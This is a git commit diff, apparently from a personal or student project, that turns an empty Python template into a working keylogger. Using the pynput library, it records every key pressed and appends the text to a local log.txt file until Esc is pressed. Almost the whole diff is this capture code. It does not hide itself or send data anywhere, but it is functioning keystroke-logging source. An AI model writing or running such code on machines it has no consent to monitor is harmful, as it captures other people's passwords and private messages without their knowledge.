b50c280fb9b4bc64e7eea28f5768f31efd9080e8
ritadas0020 <77899170+ritadas0020@users.noreply.github.com>
2022-01-06 17:23:53 +0530

    updated keyloger.py project
    here the work is done using python and its libraries.

--- KEYLOGGER_project.py
+++ KEYLOGGER_project.py
@@ -8,9 +8,36 @@
 # Copyright:   (c) 08012 2022
 # Licence:     <your licence>
 #-------------------------------------------------------------------------------
+import pynput
+from pynput.keyboard import Key , Listener
+count = 0
+keys = []
 
-def main():
-    pass
+def on_press(key):
+                  global count , keys
+                  keys.append(key)
+                  count+=1
+                  if count>=1:
+                               count=0
+                               write_file(keys)
+                               keys=[]
 
-if __name__ == '__main__':
-    main()
+
+def write_file(keys):
+                     with open("log.txt" ,"a") as f:
+                                       for key in keys:
+                                            k=str(key).replace("'"," ")
+                                            if k.find("space") > 0:
+                                                f.write('\n')
+                                            elif k.find("Key") == -1:
+                                                f.write(k)
+
+
+def on_release (key):
+    if key == Key.esc:
+        return False
+
+
+
+with Listener (on_press= on_press , on_release = on_release) as listener:
+    listener.join()
